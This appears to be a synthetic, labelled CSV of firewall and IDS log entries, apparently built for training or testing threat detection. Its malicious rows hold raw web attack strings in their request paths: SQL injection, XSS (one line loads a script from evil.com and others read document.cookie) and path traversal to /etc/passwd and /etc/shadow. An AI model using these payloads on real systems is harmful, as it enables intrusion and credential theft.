timestamp,source_ip,dest_ip,protocol,action,threat_label,log_type,bytes_transferred,user_agent,request_path
2024-05-01T14:24:34,192.168.1.55,192.168.1.10,UDP,allowed,suspicious,firewall,4823172,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/upload
2024-05-02T22:10:25,192.168.1.30,192.168.1.175,HTTP,allowed,malicious,ids,286,python-requests/2.28.0,/query?val=1/*comment*/OR/**/1=1
2024-05-01T14:47:03,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,346,python-requests/2.28.0,/admin/login.php
2024-05-03T07:34:55,192.168.1.148,192.168.1.122,TCP,allowed,suspicious,ids,1753,nikto/2.1.6,/.git/
2024-05-01T21:32:34,192.168.1.241,192.168.1.225,TCP,allowed,suspicious,ids,336,sqlmap/1.7,/wp-admin/
2024-05-02T15:10:36,192.168.1.170,192.168.1.174,UDP,allowed,benign,firewall,3676,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/index.php
2024-05-01T14:41:21,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,548,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:18,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,485,python-requests/2.28.0,/admin/login.php
2024-05-01T14:45:12,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,281,python-requests/2.28.0,/admin/login.php
2024-05-03T07:21:27,192.168.1.155,192.168.1.28,TCP,allowed,malicious,ids,1030,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-01T15:33:18,192.168.1.13,192.168.1.202,HTTP,blocked,suspicious,ids,357,dirb/2.22,/phpinfo.php
2024-05-03T07:13:30,192.168.1.219,192.168.1.125,TCP,blocked,malicious,ids,194,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-01T15:46:42,192.168.1.12,192.168.1.63,HTTP,blocked,suspicious,ids,1032,nikto/2.1.6,/.git/
2024-05-01T14:40:42,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,438,python-requests/2.28.0,/admin/login.php
2024-05-02T18:15:37,192.168.1.143,192.168.1.102,TCP,allowed,malicious,ids,1164,curl/7.85,/files/../../etc/passwd
2024-05-03T09:07:28,192.168.1.140,192.168.1.47,HTTP,allowed,malicious,ids,529,curl/7.85,/post?title=javascript:alert(document.domain)
2024-05-02T19:10:12,192.168.1.72,192.168.1.116,HTTP,allowed,benign,application,8694,python-requests/2.28.0,/dashboard
2024-05-02T00:37:12,192.168.1.205,192.168.1.246,HTTP,allowed,benign,ids,738,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ftp
2024-05-01T14:57:09,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,582,python-requests/2.28.0,/admin/login.php
2024-05-03T11:21:02,192.168.1.156,192.168.1.180,HTTP,allowed,benign,ids,6975,python-requests/2.28.0,/login
2024-05-03T08:58:32,192.168.1.85,192.168.1.223,TCP,allowed,suspicious,ids,304,dirb/2.22,/phpinfo.php
2024-05-01T22:58:04,192.168.1.151,192.168.1.187,TCP,allowed,malicious,ids,979,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/img/../../../../etc/hosts
2024-05-02T21:01:32,192.168.1.167,192.168.1.150,SSH,allowed,benign,ids,27858,python-requests/2.28.0,/ssh
2024-05-02T09:10:05,192.168.1.188,192.168.1.227,TCP,allowed,benign,application,5041,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/
2024-05-01T14:58:15,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,314,python-requests/2.28.0,/admin/login.php
2024-05-02T04:47:28,192.168.1.95,192.168.1.81,TCP,blocked,malicious,ids,1252,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/comment?text=</script><script>document.cookie
2024-05-02T15:02:18,192.168.1.55,192.168.1.106,ICMP,allowed,benign,firewall,10648,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/dashboard
2024-05-02T11:55:44,192.168.1.32,192.168.1.13,HTTP,allowed,malicious,ids,1408,python-requests/2.28.0,/query?val=1/*comment*/OR/**/1=1
2024-05-02T21:26:53,192.168.1.25,192.168.1.191,TCP,blocked,malicious,ids,1239,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-02T03:37:40,192.168.1.141,192.168.1.68,HTTP,allowed,benign,ids,30990,python-requests/2.28.0,/ssh
2024-05-01T14:46:06,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,588,python-requests/2.28.0,/admin/login.php
2024-05-01T17:11:35,192.168.1.76,192.168.1.230,HTTP,allowed,benign,ids,33778,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login
2024-05-01T20:24:33,192.168.1.220,192.168.1.128,UDP,allowed,benign,ids,7879,curl/7.85,/
2024-05-02T20:08:44,192.168.1.249,192.168.1.194,HTTP,blocked,malicious,ids,892,python-requests/2.28.0,/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd
2024-05-02T06:05:06,192.168.1.164,192.168.1.145,HTTP,allowed,malicious,ids,388,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/download?file=../../../etc/shadow
2024-05-02T12:19:39,192.168.1.65,192.168.1.60,TCP,blocked,suspicious,ids,746,sqlmap/1.7,/wp-admin/
2024-05-01T20:39:51,192.168.1.2,192.168.1.242,TCP,allowed,malicious,ids,837,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/search?q=<script src='http://evil.com/x.js'>
2024-05-03T03:15:40,192.168.1.20,192.168.1.186,TCP,allowed,benign,ids,15249,curl/7.85,/admin/login.php
2024-05-01T15:52:11,192.168.1.238,192.168.1.80,HTTP,allowed,suspicious,ids,1564,dirb/2.22,/login
2024-05-02T22:48:19,192.168.1.233,192.168.1.114,HTTP,allowed,suspicious,ids,725,gobuster/3.1,/phpinfo.php
2024-05-02T21:54:22,192.168.1.185,192.168.1.179,TCP,allowed,malicious,ids,237,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/page?name=<script>alert(1)</script>
2024-05-02T08:12:36,192.168.1.210,192.168.1.98,TCP,allowed,benign,firewall,16415,curl/7.85,/index.html
2024-05-01T14:40:21,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,758,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:51,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,741,python-requests/2.28.0,/admin/login.php
2024-05-01T21:00:33,192.168.1.134,192.168.1.169,TCP,allowed,benign,firewall,8604,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/
2024-05-02T20:50:28,192.168.1.94,192.168.1.90,HTTP,allowed,benign,ids,22678,python-requests/2.28.0,/
2024-05-01T23:52:23,192.168.1.247,192.168.1.193,TCP,blocked,malicious,ids,667,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/comment?text=</script><script>document.cookie
2024-05-03T09:27:25,192.168.1.73,192.168.1.252,TCP,blocked,suspicious,ids,706,dirb/2.22,/login
2024-05-02T20:20:55,192.168.1.114,192.168.1.98,TCP,allowed,benign,application,16663,curl/7.85,/index.php
2024-05-02T09:28:36,192.168.1.116,192.168.1.64,HTTP,blocked,malicious,ids,203,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/api?filter=SELECT username FROM users
2024-05-01T14:00:51,192.168.1.186,192.168.1.9,SSH,allowed,benign,application,1168,python-requests/2.28.0,/index.php
2024-05-03T00:47:13,192.168.1.30,192.168.1.211,TCP,allowed,suspicious,ids,1107,sqlmap/1.7,/wp-admin/
2024-05-02T12:23:58,192.168.1.153,192.168.1.192,HTTP,allowed,suspicious,ids,354,nikto/2.1.6,/.git/
2024-05-02T13:40:20,192.168.1.173,192.168.1.131,UDP,allowed,benign,application,29390,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ftp
2024-05-01T17:41:01,192.168.1.167,192.168.1.139,TCP,blocked,suspicious,ids,1997,Nmap Scripting Engine,/login
2024-05-03T10:12:18,192.168.1.206,192.168.1.91,TCP,blocked,suspicious,ids,1371,nikto/2.1.6,/admin/
2024-05-02T21:08:14,192.168.1.23,192.168.1.76,TCP,blocked,malicious,ids,298,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/static/..%2F..%2Fetc%2Fpasswd
2024-05-01T18:24:06,192.168.1.159,192.168.1.164,TCP,allowed,malicious,ids,132,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/update?field=vbscript:msgbox(1)
2024-05-01T14:41:09,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,484,python-requests/2.28.0,/admin/login.php
2024-05-01T16:06:28,192.168.1.12,192.168.1.84,TCP,allowed,suspicious,ids,834,sqlmap/1.7,/admin/
2024-05-01T14:57:15,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,721,python-requests/2.28.0,/admin/login.php
2024-05-01T14:42:21,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,570,python-requests/2.28.0,/admin/login.php
2024-05-01T21:17:46,192.168.1.106,192.168.1.85,TCP,blocked,malicious,ids,1495,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/search?q=1 OR 1=1
2024-05-01T21:52:00,192.168.1.185,192.168.1.1,HTTP,allowed,malicious,ids,997,curl/7.85,/img/../../../../etc/hosts
2024-05-02T14:59:46,192.168.1.178,192.168.1.206,TCP,allowed,benign,ids,29595,curl/7.85,/
2024-05-01T14:42:15,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,765,python-requests/2.28.0,/admin/login.php
2024-05-01T21:10:06,192.168.1.195,192.168.1.163,TCP,allowed,suspicious,ids,440,gobuster/3.1,/robots.txt
2024-05-01T14:40:12,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,428,python-requests/2.28.0,/admin/login.php
2024-05-01T14:57:54,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,457,python-requests/2.28.0,/admin/login.php
2024-05-02T06:43:51,192.168.1.55,192.168.1.231,TCP,allowed,malicious,ids,195,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/post?title=javascript:alert(document.domain)
2024-05-03T08:08:04,192.168.1.140,192.168.1.146,HTTP,allowed,benign,ids,24906,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-02T17:26:22,192.168.1.81,192.168.1.245,HTTP,allowed,malicious,ids,1191,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login?pass=admin' OR 'x'='x
2024-05-02T18:12:36,192.168.1.169,192.168.1.154,ICMP,allowed,benign,ids,33137,curl/7.85,/ftp
2024-05-03T00:43:07,192.168.1.129,192.168.1.236,TCP,blocked,suspicious,ids,1140,dirb/2.22,/wp-admin/
2024-05-01T14:58:45,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,308,python-requests/2.28.0,/admin/login.php
2024-05-01T17:22:53,192.168.1.11,192.168.1.252,SSH,allowed,benign,firewall,34268,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/admin/login.php
2024-05-01T14:57:00,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,797,python-requests/2.28.0,/admin/login.php
2024-05-01T14:59:18,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,700,python-requests/2.28.0,/admin/login.php
2024-05-02T23:06:59,192.168.1.95,192.168.1.173,HTTP,allowed,suspicious,ids,1784,Nmap Scripting Engine,/robots.txt
2024-05-03T11:57:35,192.168.1.176,192.168.1.236,HTTP,blocked,suspicious,ids,1629,nikto/2.1.6,/wp-admin/
2024-05-02T19:47:52,192.168.1.28,192.168.1.66,ICMP,allowed,benign,firewall,12390,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ftp
2024-05-02T20:08:52,192.168.1.127,192.168.1.226,TCP,allowed,malicious,ids,1218,curl/7.85,/download?file=../../../etc/shadow
2024-05-03T05:20:14,192.168.1.65,192.168.1.205,TCP,blocked,suspicious,ids,1453,nikto/2.1.6,/wp-admin/
2024-05-03T10:42:45,192.168.1.176,192.168.1.43,ICMP,allowed,benign,firewall,29343,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/index.php
2024-05-01T14:56:21,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,697,python-requests/2.28.0,/admin/login.php
2024-05-03T12:42:25,192.168.1.185,192.168.1.159,TCP,allowed,benign,application,3082,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/ssh
2024-05-03T04:15:58,192.168.1.115,192.168.1.136,TCP,blocked,malicious,ids,1255,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/search?q=1 OR 1=1
2024-05-02T06:06:25,192.168.1.227,192.168.1.55,SSH,allowed,benign,ids,23745,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-01T20:23:15,192.168.1.72,192.168.1.99,HTTP,allowed,malicious,ids,508,python-requests/2.28.0,/static/..%2F..%2Fetc%2Fpasswd
2024-05-01T20:33:25,192.168.1.242,192.168.1.101,TCP,blocked,malicious,ids,540,python-requests/2.28.0,/search?q=1' AND '1'='1
2024-05-01T14:47:12,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,452,python-requests/2.28.0,/admin/login.php
2024-05-02T22:54:27,192.168.1.79,192.168.1.119,TCP,blocked,malicious,ids,285,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/assets/..%5C..%5Cwindows%5Csystem32
2024-05-01T14:41:54,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,470,python-requests/2.28.0,/admin/login.php
2024-05-02T02:53:57,192.168.1.244,192.168.1.198,TCP,allowed,malicious,ids,1254,python-requests/2.28.0,/query?val=1/*comment*/OR/**/1=1
2024-05-01T14:57:42,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,594,python-requests/2.28.0,/admin/login.php
2024-05-01T14:00:26,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,4802247,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/upload
2024-05-03T03:34:24,192.168.1.45,192.168.1.142,HTTP,allowed,malicious,ids,1246,curl/7.85,/name?v=<ScRiPt>alert(xss)</ScRiPt>
2024-05-03T00:17:35,192.168.1.126,192.168.1.230,TCP,blocked,malicious,ids,1414,python-requests/2.28.0,/read?f=%2e%2e%2f%2e%2e%2fetc%2fpasswd
2024-05-01T17:12:37,192.168.1.1,192.168.1.86,TCP,allowed,suspicious,ids,430,sqlmap/1.7,/robots.txt
2024-05-01T14:11:12,192.168.1.73,192.168.1.186,HTTP,allowed,suspicious,ids,1872,sqlmap/1.7,/login
2024-05-01T23:55:51,192.168.1.192,192.168.1.101,ICMP,allowed,benign,ids,9542,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/ssh
2024-05-02T06:08:03,192.168.1.86,192.168.1.200,HTTP,blocked,malicious,ids,1145,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/login?pass=admin' OR 'x'='x
2024-05-01T14:00:46,192.168.1.99,192.168.1.20,UDP,allowed,suspicious,firewall,1225137,python-requests/2.28.0,/upload
2024-05-03T00:44:39,192.168.1.197,192.168.1.60,TCP,allowed,benign,ids,26881,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-01T14:46:54,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,711,python-requests/2.28.0,/admin/login.php
2024-05-01T14:40:34,192.168.1.3,192.168.1.179,TCP,blocked,malicious,ids,964,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/get?file=....//....//etc/passwd
2024-05-02T03:28:55,192.168.1.50,192.168.1.56,HTTP,allowed,suspicious,ids,1583,dirb/2.22,/phpinfo.php
2024-05-01T14:41:36,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,304,python-requests/2.28.0,/admin/login.php
2024-05-02T06:54:26,192.168.1.119,192.168.1.164,HTTP,allowed,suspicious,ids,622,nikto/2.1.6,/robots.txt
2024-05-03T07:38:06,192.168.1.141,192.168.1.216,TCP,blocked,malicious,ids,211,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/files/../../etc/passwd
2024-05-01T14:57:57,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,766,python-requests/2.28.0,/admin/login.php
2024-05-01T14:58:03,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,232,python-requests/2.28.0,/admin/login.php
2024-05-01T19:37:08,192.168.1.76,192.168.1.217,HTTP,blocked,malicious,ids,1455,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/data?id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)
2024-05-01T14:56:57,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,752,python-requests/2.28.0,/admin/login.php
2024-05-03T07:38:55,192.168.1.134,192.168.1.44,TCP,blocked,malicious,ids,384,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/post?title=javascript:alert(document.domain)
2024-05-03T07:06:18,192.168.1.165,192.168.1.163,TCP,allowed,malicious,ids,409,curl/7.85,/login?user=admin'--
2024-05-02T00:44:40,192.168.1.202,192.168.1.231,TCP,allowed,suspicious,ids,1858,sqlmap/1.7,/login
2024-05-01T14:41:33,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,544,python-requests/2.28.0,/admin/login.php
2024-05-01T18:23:09,192.168.1.157,192.168.1.246,TCP,blocked,suspicious,ids,1381,dirb/2.22,/login
2024-05-01T14:56:06,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,259,python-requests/2.28.0,/admin/login.php
2024-05-02T18:58:21,192.168.1.57,192.168.1.193,ICMP,allowed,benign,firewall,3648,python-requests/2.28.0,/ftp
2024-05-02T13:33:46,192.168.1.16,192.168.1.6,HTTP,blocked,malicious,ids,327,python-requests/2.28.0,/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-01T14:24:32,192.168.1.55,192.168.1.10,TCP,allowed,suspicious,firewall,4626520,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/upload
2024-05-03T04:04:04,192.168.1.81,192.168.1.240,HTTP,blocked,suspicious,ids,1471,dirb/2.22,/robots.txt
2024-05-01T14:40:57,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,758,python-requests/2.28.0,/admin/login.php
2024-05-02T09:32:41,192.168.1.127,192.168.1.38,HTTP,blocked,malicious,ids,990,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/update?field=vbscript:msgbox(1)
2024-05-02T06:52:59,192.168.1.205,192.168.1.104,HTTP,blocked,malicious,ids,1411,curl/7.85,/update?field=vbscript:msgbox(1)
2024-05-02T23:52:43,192.168.1.231,192.168.1.74,TCP,blocked,suspicious,ids,1004,Nmap Scripting Engine,/admin/
2024-05-02T22:04:24,192.168.1.12,192.168.1.237,HTTP,allowed,benign,firewall,24598,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/login
2024-05-02T12:38:33,192.168.1.72,192.168.1.216,TCP,blocked,malicious,ids,566,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/assets/..%5C..%5Cwindows%5Csystem32
2024-05-01T14:46:07,192.168.1.1,192.168.1.134,HTTP,allowed,benign,ids,18893,curl/7.85,/
2024-05-01T14:45:21,192.168.1.125,192.168.1.100,TCP,blocked,malicious,ids,589,python-requests/2.28.0,/admin/login.php
2024-05-01T17:19:44,192.168.1.77,192.168.1.243,SSH,allowed,benign,ids,34197,python-requests/2.28.0,/ssh
2024-05-03T00:56:17,192.168.1.90,192.168.1.144,TCP,allowed,malicious,ids,349,python-requests/2.28.0,/login?pass=admin' OR 'x'='x
2024-05-02T22:05:23,192.168.1.12,192.168.1.17,SSH,allowed,benign,application,20693,"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",/dashboard
2024-05-01T15:55:11,192.168.1.198,192.168.1.102,ICMP,allowed,benign,firewall,6911,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/index.php
2024-05-02T15:47:54,192.168.1.174,192.168.1.198,TCP,allowed,malicious,ids,493,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/items?category=1 AND 1=1
2024-05-01T14:56:27,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,745,python-requests/2.28.0,/admin/login.php
2024-05-03T05:08:27,192.168.1.206,192.168.1.171,HTTP,blocked,malicious,ids,1493,python-requests/2.28.0,/login?user=admin'--
2024-05-01T14:58:57,192.168.1.88,192.168.1.50,HTTP,blocked,malicious,ids,356,python-requests/2.28.0,/admin/login.php
2024-05-02T03:41:06,192.168.1.114,192.168.1.55,TCP,allowed,malicious,ids,1157,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/files/../../etc/passwd
2024-05-03T00:04:58,192.168.1.206,192.168.1.164,TCP,allowed,benign,ids,27359,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/
2024-05-01T18:31:25,192.168.1.171,192.168.1.31,TCP,allowed,malicious,ids,427,curl/7.85,/login?pass=admin' OR 'x'='x
2024-05-01T18:59:45,192.168.1.213,192.168.1.196,TCP,blocked,suspicious,ids,1765,nikto/2.1.6,/login
2024-05-03T13:16:34,192.168.1.105,192.168.1.30,TCP,blocked,suspicious,ids,176,sqlmap/1.7,/admin/
2024-05-02T16:01:38,192.168.1.197,192.168.1.150,HTTP,blocked,malicious,ids,305,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/static/..%2F..%2Fetc%2Fpasswd
2024-05-01T14:57:27,192.168.1.77,192.168.1.200,SSH,blocked,malicious,ids,430,python-requests/2.28.0,/admin/login.php
2024-05-01T14:41:27,192.168.1.201,192.168.1.101,SSH,blocked,malicious,ids,359,python-requests/2.28.0,/admin/login.php
2024-05-02T22:08:21,192.168.1.140,192.168.1.56,TCP,blocked,malicious,ids,1438,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/post?title=javascript:alert(document.domain)
2024-05-02T03:36:36,192.168.1.41,192.168.1.93,ICMP,allowed,benign,application,7854,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/ftp
2024-05-01T15:04:55,192.168.1.92,192.168.1.203,TCP,allowed,suspicious,ids,132,nikto/2.1.6,/login
2024-05-01T18:32:07,192.168.1.112,192.168.1.170,HTTP,blocked,malicious,ids,697,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/load?path=..%2F..%2F..%2Fetc%2Fpasswd
2024-05-02T14:09:17,192.168.1.10,192.168.1.23,TCP,allowed,benign,firewall,11764,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/login
2024-05-01T20:25:05,192.168.1.17,192.168.1.68,HTTP,allowed,benign,ids,5345,python-requests/2.28.0,/
2024-05-01T17:25:15,192.168.1.238,192.168.1.98,UDP,allowed,benign,ids,20590,python-requests/2.28.0,/
2024-05-03T11:22:10,192.168.1.151,192.168.1.134,TCP,blocked,malicious,ids,948,"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36",/img/../../../../etc/hosts
2024-05-02T18:52:54,192.168.1.235,192.168.1.62,TCP,allowed,malicious,ids,879,curl/7.85,"/input?val=data:text/html,<script>alert(1)</script>"
2024-05-02T07:44:52,192.168.1.117,192.168.1.142,TCP,allowed,suspicious,ids,490,gobuster/3.1,/phpinfo.php
2024-05-01T16:52:09,192.168.1.141,192.168.1.128,HTTP,allowed,benign,application,31600,Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0,/dashboard
2024-05-03T05:00:13,192.168.1.226,192.168.1.89,TCP,allowed,malicious,ids,884,curl/7.85,/fetch?name=..%255c..%255cwindows%255csystem32%255cdrivers%255cetc%255chosts
2024-05-01T16:15:34,192.168.1.244,192.168.1.64,TCP,blocked,suspicious,ids,1372,Nmap Scripting Engine,/login
2024-05-01T19:54:42,192.168.1.41,192.168.1.62,TCP,blocked,suspicious,ids,420,sqlmap/1.7,/wp-admin/
